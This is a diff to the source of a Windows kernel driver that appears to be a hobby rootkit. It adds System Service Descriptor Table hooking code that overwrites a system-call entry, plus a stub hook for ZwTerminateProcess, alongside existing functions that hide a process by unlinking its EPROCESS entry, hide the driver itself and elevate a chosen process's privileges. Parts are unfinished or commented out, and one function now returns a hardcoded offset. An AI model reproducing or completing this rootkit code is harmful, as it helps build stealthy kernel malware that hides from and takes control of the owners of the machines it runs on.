@@ -1,8 +1,14 @@
 #include "Driver.h"
 
-
-
-
+NTSTATUS NEWZwTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+unsigned long ssdt_writeService(unsigned long sysServiceFunction, unsigned long hookAddr);
+void OnUnload(IN PDRIVER_OBJECT DriverObject);
+int GetImageFileNameOffset(char* name);
+int SearchAndRemoveEPROCESSbyOffset(int offset, char* target);
+int HideDriverSection(PDRIVER_OBJECT DriverObject);
+int HideDriverSection(PDRIVER_OBJECT DriverObject);
+int ElevateSpecificPID(int targetPID);
+int ssdt_init();
 
 void OnUnload(IN PDRIVER_OBJECT DriverObject) {
     DbgPrintEx(0, 0, "Bye Bye !!!\n");
@@ -22,8 +28,8 @@ int GetImageFileNameOffset(char* name) {
             return i;
         }
     }
-    DbgPrintEx(0, 0, "Process not found...\n");
-    return -1;
+    DbgPrintEx(0, 0, "Offset not found...\n");
+    return 1448;
 }
 int SearchAndRemoveEPROCESSbyOffset(int offset, char *target) {
     PEPROCESS currentproc = PsGetCurrentProcess();
@@ -58,7 +64,7 @@ int HideProcess(int targetPID) {
         return -1;
     }
     else if (result == STATUS_INVALID_CID) {
-        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
+        DbgPrint("An invalid client ID was specified. (0xC000000B)");
         return -1;
     }
     if (result != STATUS_SUCCESS) {
@@ -118,19 +124,13 @@ int ElevateSpecificPID(int targetPID) {
 
 //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm
 
-typedef struct SystemServiceDescriptorTable {
-    void* ServiceTableBase;
-    void* ServiceCounterTableBase;
-    unsigned int          NumberOfServices;
-    unsigned char* ParamTableBase;
-} SSDT;
-
 unsigned long* g_pMappedSCT;
 MDL* g_pMdlSCT;//init memory descriptor list
-
-
+int status;
 
 SSDT KeServiceDescriptorTable;
+
+ZWTERMINATEPROCESS oldZwTerminateProcess = NULL;
 
 int ssdt_init()
 {
@@ -138,6 +138,7 @@ int ssdt_init()
     if (!g_pMdlSCT)
     {
         DbgPrintEx(0, 0, "MDL not allocated...\n");
+        status = -1;
         return -1;
     }
 
@@ -145,22 +146,37 @@ int ssdt_init()
 
     g_pMdlSCT->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
 
-    g_pMappedSCT = MmMapLockedPagesSpecifyCache(g_pMdlSCT, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority);
-
-
+    g_pMappedSCT = MmMapLockedPagesSpecifyCache(g_pMdlSCT, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority);//MmMapLockedPage etait outdate
+    DbgPrintEx(0, 0, "g_pMappedSCT: %p\n", g_pMappedSCT);
+    status = 1;
     return 1;
 
 }
+unsigned long ssdt_writeService(unsigned long sysServiceFunction, unsigned long hookAddr)
+{
+    unsigned long ret;
+
+    if (!status)
+        return 0;
+
+    ret = (unsigned long)InterlockedExchange((PLONG)&g_pMappedSCT[SYSCALL_INDEX(sysServiceFunction)], (long)hookAddr);
+
+    return ret;
+}
+
+NTSTATUS NEWZwTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
+    DbgPrintEx(0, 0, "ZwTerminateProcess hooked !!!\n");
+    //TODO (call original)
+    return 1;
+}
 
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
-    // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
     //SearchAndRemoveEPROCESSbyOffset("pwnme.exe");
     //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "pwnme.exe");
     //HideDriverSection(DriverObject);
-    if (ssdt_init() == 1) {
-        DbgPrintEx(0, 0, "Ouais c'est greg\n");
-    }
+    ssdt_init();
+    //ssdt_writeService((unsigned long)ZwTerminateProcess, (unsigned long)NEWZwTerminateProcess);//dont work already
     return STATUS_SUCCESS;
 }
